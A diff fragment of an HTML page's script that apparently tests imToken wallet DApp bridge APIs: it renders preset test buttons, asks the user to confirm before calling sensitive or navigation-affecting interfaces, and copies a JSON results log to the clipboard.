+            <button class="${type === "danger" ? "danger" : type === "warn" ? "warn" : "ok"}"
+              onclick='callPreset(${JSON.stringify(api.name)}, ${JSON.stringify(api.params)})'>
+              测试这个
+            </button>
+          </div>
+        `).join("")}
+      `;
+    }).join("");
+  }
+
+  function escapeHtml(str) {
+    return String(str)
+      .replaceAll("&", "&amp;")
+      .replaceAll("<", "&lt;")
+      .replaceAll(">", "&gt;")
+      .replaceAll('"', "&quot;")
+      .replaceAll("'", "&#039;");
+  }
+
+  async function callPreset(name, params) {
+    const sensitive = SENSITIVE_EMPTY_PROBE_APIS.some(x => x.name === name);
+    const risky = ["navigator.closeDapp", "navigator.goBack", "native.scanQRCode", "user.showAccountSwitch"].includes(name);
+
+    if (sensitive) {
+      const yes = confirm("这是敏感候选接口测试，只传空参数或默认参数。确定继续？");
+      if (!yes) return;
+    }
+
+    if (risky) {
+      const yes = confirm("这个接口可能会打开系统页面、返回或关闭 DApp。确定测试？");
+      if (!yes) return;
+    }
+
+    await callImTokenApi(name, params, { timeout: 20000 });
+  }
+
+  window.callPreset = callPreset;
+
+  async function copyLog() {
+    const data = {
+      startedAt: state.startedAt,
+      copiedAt: new Date().toISOString(),
+      envInfo: $("envInfo").textContent,
+      results: state.results,
+      log: $("log").textContent
+    };
+
+    const text = JSON.stringify(data, null, 2);
+
+    try {
+      await navigator.clipboard.writeText(text);
+      alert("已复制日志");
+    } catch (e) {
+      $("manualParams").value = text;
+      alert("浏览器不允许直接复制，已把日志放到参数框里，你手动复制");
+    }
+  }
+
+  window.copyLog = copyLog;
+
+  renderApiList();
+  detectEnv();
 })();
 </script>
 </body>
